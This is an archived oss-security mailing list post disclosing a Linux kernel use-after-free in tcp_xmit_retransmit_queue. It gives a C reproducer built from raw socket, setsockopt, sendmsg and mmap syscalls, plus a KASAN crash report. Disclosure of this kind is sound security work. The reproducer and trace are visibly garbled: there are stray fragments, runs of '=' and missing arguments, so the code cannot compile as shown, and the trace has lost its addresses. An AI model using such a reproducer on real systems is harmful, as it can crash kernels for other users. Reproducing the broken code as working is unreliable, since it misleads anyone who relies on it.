  oss-security - Linux tcp_xmit_retransmit_queue use after free on / master            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Mon, 15 Aug From: Marco Grassi <marco.gra@...il.com> To: oss-security@...ts.openwall.com Cc: cve-assign@...re.org Subject: Linux tcp_xmit_retransmit_queue use after free on / master  Hello, this program will cause a use after free of read 4 in tcp_xmit_retransmit_queue or other tcp_ functions, often in another totally unrelated process.  reproducer + KASAN report is provided, tested on master available at the time of writing and on 4.8 rc1  Thank you  Marco (@marcograss) - https://marcograss.github.io/  -------  // to build clang derp4.c -o derp4 -static  #include <unistd.h> #include <sys/syscall.h> #include <string.h> #include <stdint.h> #include <pthread.h> #include <stdio.h>  #ifndef SYS_mmap #define SYS_mmap 9 #endif #ifndef SYS_socket #define SYS_socket 41 #endif #ifndef SYS_bind #define SYS_bind 49 #endif #ifndef SYS_sendto #define SYS_sendto 44 #endif #ifndef SYS_setsockopt #define SYS_setsockopt 54 #endif #ifndef SYS_dup #define SYS_dup 32 #endif #ifndef SYS_sendmsg #define SYS_sendmsg 46 #endif #ifndef SYS_recvfrom #define SYS_recvfrom 45 #endif #ifndef SYS_write #define SYS_write 1 #endif  long r[62];   int main(int argc, char **argv) { while (1) { pid_t pid = fork();  if (pid == 0) { r[0] = syscall(SYS_mmap, 0x3ul, 0xfffffffffffffffful, 0x0ul); r[1] = syscall(SYS_socket, 0xaul, 0x1ul, 0x0ul, 0, 0, 0); r[3] = syscall(SYS_bind, r[1], 0, 0, 0); r[4] = syscall(SYS_mmap, 0x3ul, 0xfffffffffffffffful, 0x0ul); 28); r[7] = syscall(SYS_sendto, r[1], 0xa5ul, 0x1cul); = r[9] = syscall(SYS_setsockopt, r[1], 0x1ul, 0x8ul, 0x4ul, 0); r[10] = syscall(SYS_dup, r[1], 0, 0, 0, 0, 0); = r[12] = syscall(SYS_setsockopt, r[1], 0xbul, 0x4ul, 0); = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = r[47] = syscall(SYS_sendmsg, r[10], 0, 0, 0); = = = r[51] = syscall(SYS_recvfrom, r[10], 0xdeul, 0x0ul, 0x8ul); r[53] = syscall(SYS_sendto, r[10], 0x0ul, 0x0ul); r[54] = syscall(SYS_mmap, 0x3ul, 0xfffffffffffffffful, 0x0ul); = = = = = = r[61] = syscall(SYS_write, r[10], 0, 0, 0); } else if (pid > 0) { int returnStatus;             waitpid(pid, &returnStatus, 0);             printf("collected child\n"); } else { printf("fork failed\n"); exit(1); } } return 0; }   // KASAN report on equivalent on master  /* [   BUG: KASAN: use-after-free in at addr [   Read of size 4 by task [   CPU: 0 PID: Comm: rsyslogd Tainted: G    B #1 [   Hardware name: QEMU Standard PC + PIIX, BIOS [    [    [    [   Call Trace: [    <IRQ>  [    [    [    [    ? [    [    [    [    ? [    ? [    ? [    ? [    ? [    ? [    ? [    [    ? [    ? [    ? [    ? [    ? [    ? [    ? [    [    [    ? [    ? [    [    [    ? [    ? [    ? [    ? [    [    [    ? [    ? [    ? [    ? [    ? [    [    ? [    ? [    ? [    ? [    ? [    ? [    ? [    [    [    [    ? [    ? [    ? [    ? [    ? [    [    [    [    [    <EOI> Object at in cache skbuff_fclone_cache size: [   Allocated: [   PID = [    [    [    [    [    [    [    [    [    [    [    [    [    [    [    [   Freed: [   PID = [    [    [    [    [    [    [    [    [    [    [    [    [    [    [   Memory state around the buggy address: [    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 [    00 00 00 00 00 fc fc fc fc fc fc fc fc fc fc fc [   fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb [                                     ^ [    fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb [    fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb [   ================================================================== */   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      